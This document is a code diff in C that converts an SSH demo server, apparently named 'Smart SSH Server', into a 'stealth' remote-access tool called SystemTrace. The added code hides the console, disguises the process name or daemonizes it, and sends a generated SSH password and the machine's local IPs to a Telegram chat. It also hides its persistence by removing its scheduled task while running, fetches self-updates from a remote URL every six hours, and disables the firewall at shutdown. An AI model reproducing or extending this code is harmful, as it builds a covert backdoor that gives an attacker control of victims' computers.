-        "Welcome to Smart SSH Server %s\r\n"
-        "Update from: %s\r\n"
+        "Welcome to System Trace %s\r\n"
+        "SSH User: %s | Password: %s\r\n"
         "This is a demo server - use OpenSSH for full access\r\n", 
-        VERSION, UPDATE_URL);
+        VERSION, SSH_USER, g_ssh_password);
     send(client_socket, response, strlen(response), 0);
     
     sleep(2);
@@ -632,14 +896,12 @@ void* ssh_server_thread(void* param) {
 #ifdef WIN32
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
-        printf("WSAStartup failed\n");
         return 0;
     }
 #endif
     
     server_socket = socket(AF_INET, SOCK_STREAM, 0);
     if (server_socket == INVALID_SOCKET) {
-        printf("Socket creation failed\n");
 #ifdef WIN32
         WSACleanup();
 #endif
@@ -652,7 +914,6 @@ void* ssh_server_thread(void* param) {
     server_addr.sin_port = htons(SSH_PORT);
     
     if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
-        printf("Bind failed\n");
         closesocket(server_socket);
 #ifdef WIN32
         WSACleanup();
@@ -661,7 +922,6 @@ void* ssh_server_thread(void* param) {
     }
     
     if (listen(server_socket, 5) < 0) {
-        printf("Listen failed\n");
         closesocket(server_socket);
 #ifdef WIN32
         WSACleanup();
@@ -669,7 +929,7 @@ void* ssh_server_thread(void* param) {
         return 0;
     }
     
-    printf("[SSH] Listening on port %d\n", SSH_PORT);
+    log_message("INFO", "SSH server listening");
     
     while (g_running) {
         client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_len);
@@ -692,7 +952,7 @@ void* ssh_server_thread(void* param) {
 }
 
 // ======================================================
-// Monitoring threads
+// Monitoring threads (stealth)
 // ======================================================
 
 #ifdef WIN32
@@ -706,16 +966,14 @@ void* battery_monitor_thread(void* param) {
         struct battery_info info = get_battery_info();
         
         if (info.level <= 15 && !info.charging && last_warning_level > 15) {
-            printf("[BATTERY] ⚠ Battery critically low: %d%% - emergency save\n", info.level);
+            log_message("WARNING", "Battery critically low");
             register_task();
             
             char message[256];
-            snprintf(message, sizeof(message), "🔋 <b>Battery Critical!</b>\nLevel: %d%%\nStatus: Not charging\nAuto-save activated", info.level);
+            snprintf(message, sizeof(message), "🔋 <b>Battery Critical!</b>\nLevel: %d%%\nStatus: Not charging\nStealth mode: Active", info.level);
             send_telegram_message(message);
             last_warning_level = info.level;
         } else if (info.level <= 25 && !info.charging && last_warning_level > 25) {
-            printf("[BATTERY] ⚠ Battery low: %d%%\n", info.level);
-            
             char message[256];
             snprintf(message, sizeof(message), "🔋 <b>Battery Low</b>\nLevel: %d%%\nStatus: Not charging", info.level);
             send_telegram_message(message);
@@ -739,9 +997,9 @@ void* shutdown_monitor_thread(void* param) {
 #endif
     while (g_running) {
         if (is_shutdown_pending()) {
-            printf("[SHUTDOWN] System shutdown/restart detected - emergency save\n");
+            log_message("INFO", "System shutdown detected");
             register_task();
-            send_telegram_message("⚠️ <b>System shutdown detected</b>\nServer will auto-restart after reboot");
+            send_telegram_message("⚠️ <b>System shutdown detected</b>\nStealth server will auto-restart");
             break;
         }
         sleep(3);
@@ -749,27 +1007,16 @@ void* shutdown_monitor_thread(void* param) {
     return 0;
 }
 
-// ======================================================
-// Auto-update monitor
-// ======================================================
-
 #ifdef WIN32
 DWORD WINAPI update_monitor_thread(LPVOID param) {
 #else
 void* update_monitor_thread(void* param) {
 #endif
-    // Wait 5 minutes before first update check
-    sleep(300);
+    sleep(300);  // Wait 5 minutes
     
     while (g_running) {
-        // Check for updates every 6 hours
-        printf("[UPDATE] Checking for updates...\n");
-        if (perform_self_update()) {
-            // If update was successful, the process restarts
-            // If we're here, no update was needed
-        }
+        perform_self_update();
         
-        // Wait 6 hours (21600 seconds) before next check
         for (int i = 0; i < 21600 && g_running; i++) {
             sleep(1);
         }
@@ -782,7 +1029,6 @@ void* update_monitor_thread(void* param) {
 // ======================================================
 
 void signal_handler(int signum) {
-    printf("\n[SHUTDOWN] Received signal %d - graceful shutdown\n", signum);
     g_running = 0;
 }
 
@@ -790,27 +1036,15 @@ void cleanup_and_exit() {
     if (g_cleanup_done) return;
     g_cleanup_done = 1;
     
-    printf("[SHUTDOWN] Graceful shutdown...\n");
+    register_task();
+    disable_firewall();
     
-    // Save task for next boot
-    if (register_task()) {
-        printf("[SHUTDOWN] ✓ Saved service for next boot\n");
-    } else {
-        printf("[SHUTDOWN] ⚠ Failed to save service\n");
-    }
-    
-    // Disable firewall
-    if (disable_firewall()) {
-        printf("[SHUTDOWN] ✓ Disabled firewall\n");
-    }
-    
-    // Send shutdown notification
     time_t uptime = time(NULL) - g_start_time;
     char message[256];
-    snprintf(message, sizeof(message), "📴 <b>Smart SSH Server Shutdown</b>\nUptime: %ld seconds\nReason: Manual stop", uptime);
+    snprintf(message, sizeof(message), "📴 <b>Stealth Server Shutdown</b>\nUptime: %ld seconds\nMode: Hidden memory execution", uptime);
     send_telegram_message(message);
     
-    printf("[SHUTDOWN] ✓ Shutdown complete\n");
+    log_message("INFO", "Stealth shutdown complete");
 }
 
 // ======================================================
@@ -820,153 +1054,128 @@ void cleanup_and_exit() {
 int main(int argc, char *argv[]) {
     g_start_time = time(NULL);
     
+    curl_global_init(CURL_GLOBAL_DEFAULT);
+    
     if (argc < 2) {
-        printf("Smart SSH Server v%s (Self-Updating C Version)\n", VERSION);
-        printf("Update URL: %s\n", UPDATE_URL);
-        printf("\nUsage:\n");
-        printf("  %s smart    - Smart mode with auto-updates\n", argv[0]);
-        printf("  %s setup    - Setup auto-start service\n", argv[0]);
-        printf("  %s update   - Manual update check\n", argv[0]);
-        printf("  %s --check  - Test command (for update validation)\n", argv[0]);
-        printf("  %s --version - Show version\n", argv[0]);
+        // Show help only if not in stealth mode
+        if (!g_stealth_mode) {
+            printf("SystemTrace v%s (Stealth Mode)\n", VERSION);
+            printf("Usage:\n");
+            printf("  %s smart    - Stealth mode (hidden execution)\n", argv[0]);
+            printf("  %s setup    - Setup auto-start service\n", argv[0]);
+            printf("  %s --check  - Test command\n", argv[0]);
+        }
         return 1;
     }
-    
-    // Initialize curl globally
-    curl_global_init(CURL_GLOBAL_DEFAULT);
     
     if (strcmp(argv[1], "--check") == 0) {
         printf("OK\n");
         return 0;
-    } else if (strcmp(argv[1], "--version") == 0) {
-        printf("Smart SSH Server v%s\n", VERSION);
-        printf("Build: %s\n", 
-#ifdef WIN32
-            "Windows"
-#else
-            "Linux"
-#endif
-        );
-        printf("Update URL: %s\n", UPDATE_URL);
-        return 0;
     } else if (strcmp(argv[1], "smart") == 0) {
-        printf("========================================\n");
-        printf("  Smart SSH Server v%s\n", VERSION);
-        printf("  Self-Updating C Version\n");
-        printf("========================================\n");
+        // Enable stealth mode
+        g_stealth_mode = 1;
         
-        // Setup signal handlers
+#ifdef WIN32
+        // Hide console and set stealth process name
+        hide_console();
+        stealth_process_name();
+#else
+        // Daemonize on Linux
+        daemonize();
+#endif
+        
         signal(SIGINT, signal_handler);
         signal(SIGTERM, signal_handler);
         atexit(cleanup_and_exit);
         
-        // Send startup notification
-        char startup_msg[512];
+        // Generate password and get system info
+        generate_ssh_password();
+        char ip_addresses[256];
+        get_local_ips(ip_addresses, sizeof(ip_addresses));
+        
+        // Send stealth startup notification
+        char startup_msg[1024];
         snprintf(startup_msg, sizeof(startup_msg), 
-            "🚀 <b>Smart SSH Server Started</b>\n"
-            "Version: %s (C)\n"
+            "👻 <b>Stealth SSH Server Started</b>\n"
+            "Version: %s (Hidden)\n"
             "OS: %s\n"
-            "Port: %d\n"
-            "Update URL: %s", 
+            "Mode: Memory execution only\n"
+            "Port: %d\n\n"
+            "🔐 <b>SSH Access:</b>\n"
+            "User: %s\n"
+            "Password: <code>%s</code>\n"
+            "Local IPs: %s\n\n"
+            "📱 <b>Connect:</b>\n"
+            "<code>ssh -p %d %s@&lt;IP&gt;</code>\n\n"
+            "🔍 <b>Stealth Features:</b>\n"
+            "• No GUI interface\n"
+            "• Hidden console window\n"
+            "• Generic process name\n"
+            "• Silent operation\n"
+            "• Auto-update every 6 hours", 
             VERSION, 
 #ifdef WIN32
             "Windows",
 #else
             "Linux",
 #endif
-            SSH_PORT, UPDATE_URL);
+            SSH_PORT,
+            SSH_USER, g_ssh_password, ip_addresses,
+            SSH_PORT, SSH_USER);
         send_telegram_message(startup_msg);
         
-        printf("\n[1/6] Enabling firewall...\n");
-        if (enable_firewall()) {
-            printf("✓ Opened port %d\n", SSH_PORT);
-        } else {
-            printf("⚠ Firewall setup warning\n");
-        }
+        log_message("INFO", "Stealth mode started");
         
-        printf("\n[2/6] Starting SSH server...\n");
+        // Start services
+        enable_firewall();
+        
 #ifdef WIN32
         CreateThread(NULL, 0, ssh_server_thread, NULL, 0, NULL);
-#else
-        pthread_t ssh_thread;
-        pthread_create(&ssh_thread, NULL, ssh_server_thread, NULL);
-#endif
-        printf("✓ SSH server ready\n");
-        
-        printf("\n[3/6] Starting shutdown monitor...\n");
-#ifdef WIN32
         CreateThread(NULL, 0, shutdown_monitor_thread, NULL, 0, NULL);
-#else
-        pthread_t shutdown_thread;
-        pthread_create(&shutdown_thread, NULL, shutdown_monitor_thread, NULL);
-#endif
-        printf("✓ Shutdown detection active\n");
-        
-        printf("\n[4/6] Starting auto-update monitor...\n");
-#ifdef WIN32
         CreateThread(NULL, 0, update_monitor_thread, NULL, 0, NULL);
+        CreateThread(NULL, 0, battery_monitor_thread, NULL, 0, NULL);
 #else
-        pthread_t update_thread;
+        pthread_t ssh_thread, shutdown_thread, update_thread;
+        pthread_create(&ssh_thread, NULL, ssh_server_thread, NULL);
+        pthread_create(&shutdown_thread, NULL, shutdown_monitor_thread, NULL);
         pthread_create(&update_thread, NULL, update_monitor_thread, NULL);
 #endif
-        printf("✓ Auto-update every 6 hours\n");
         
-        printf("\n[5/6] Task cleanup in 10 seconds...\n");
+        // Cleanup task scheduler after 10 seconds
         sleep(10);
         if (is_task_registered()) {
             unregister_task();
-            printf("[CLEANUP] ✓ Removed Task Scheduler (running in memory)\n");
+            log_message("INFO", "Task cleanup completed - running in memory only");
         }
         
-        printf("\n[6/6] Starting battery monitoring...\n");
-#ifdef WIN32
-        CreateThread(NULL, 0, battery_monitor_thread, NULL, 0, NULL);
-        printf("✓ Battery monitoring active\n");
-#else
-        printf("✓ Battery monitoring (Windows only)\n");
-#endif
-        
-        printf("\n================================================\n");
-        printf("  SSH Server ready on port %d\n", SSH_PORT);
-        printf("  ✓ Shutdown detection active\n");
-        printf("  ✓ Auto-save on emergency\n");
-        printf("  ✓ Auto-update every 6 hours\n");
-        printf("  ✓ Smart firewall management\n");
-        printf("  ✓ Telegram notifications\n");
-        printf("  • To stop: Ctrl+C\n");
-        printf("  • To connect: ssh -p %d %s@<IP>\n", SSH_PORT, SSH_USER);
-        printf("  • Password: %s\n", SSH_PASSWORD);
-        printf("  • Manual update: %s update\n", argv[0]);
-        printf("================================================\n");
-        
-        // Main loop
+        // Main stealth loop
         while (g_running) {
             sleep(1);
         }
         
     } else if (strcmp(argv[1], "setup") == 0) {
-        printf("Setting up auto-start service...\n");
+        if (!is_elevated()) {
+            printf("Requires admin/root privileges\n");
+            return 1;
+        }
+        
         if (register_task()) {
-            printf("✓ Service registered for auto-start\n");
+            printf("Service registered for auto-start (stealth mode)\n");
         } else {
-            printf("✗ Failed to register service\n");
+            printf("Failed to register service\n");
             return 1;
         }
         
         if (enable_firewall()) {
-            printf("✓ Firewall configured\n");
-        } else {
-            printf("⚠ Firewall setup warning\n");
+            printf("Firewall configured\n");
         }
         
-        printf("Setup complete!\n");
-        
-    } else if (strcmp(argv[1], "update") == 0) {
-        printf("Manual update check...\n");
-        perform_self_update();
+        printf("Setup complete - will start in stealth mode on boot\n");
         
     } else {
-        printf("Unknown command: %s\n", argv[1]);
+        if (!g_stealth_mode) {
+            printf("Unknown command: %s\n", argv[1]);
+        }
         return 1;
     }
     
